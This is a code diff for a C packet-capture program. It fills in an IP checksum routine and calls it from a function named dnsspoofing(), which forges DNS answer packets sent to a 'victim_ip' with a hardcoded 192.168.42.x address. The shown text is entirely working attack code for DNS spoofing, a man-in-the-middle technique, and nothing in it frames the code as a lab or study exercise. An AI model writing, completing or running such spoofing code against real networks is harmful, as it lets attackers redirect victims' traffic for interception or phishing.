@@ -131,10 +131,25 @@ typedef struct _pcap_info
 pAdapter_list head_list = NULL, tail_list = NULL, work_list = NULL;
 pcap_info info = { 0 };
 
-void ip_checksum()
+void ip_checksum(struct ip_header* _pIp)
 {
+	uint16_t* pIps = (uint16_t*)_pIp;
+	uint16_t len = (_pIp->header_len * 4), checksum;
+	uint32_t check = 0;
 
-}
+	len >>= 1;
+	_pIp->checksum = 0;
+
+	for (int i = 0; i < len; i++)
+		check += *pIps++;
+
+	check = (check >> 16) + (check & 0xffff);
+	check += (check >> 16);
+
+	checksum = (~check & 0xffff);
+
+	_pIp->checksum = checksum;
+};
 
 int main(int agrc, char* garv[])
 {
@@ -572,7 +587,7 @@ bool dnsspoofing()
 								memcpy(ip->dst_ip, info.victim_ip, IP_LEN);
 								ip->total_len = htons(sizeof(*ip) + sizeof(*udp) + sizeof(*dns) + sizeof(que) + strlen((char*)name) +sizeof(que) + sizeof(ans) + 1);
 								ip->checksum = 0;
-								//ip_checksum(*ip)
+								ip_checksum(ip);
 								memcpy(backwarding+datapointer, ip, sizeof(*ip));
 								datapointer += sizeof(*ip);
 
@@ -605,7 +620,7 @@ bool dnsspoofing()
 								ans.ans_type = htons(0x0001);
 								ans.ans_class = htons(0x0001);
 								ans.ans_ttl = htonl(0x0000000e);
-								anw.a_length = htons(0x0004);
+								ans.data_len = htons(0x0004);
 								ans.ans_add[0] = 192;
 								ans.ans_add[1] = 168;
 								ans.ans_add[2] = 42;
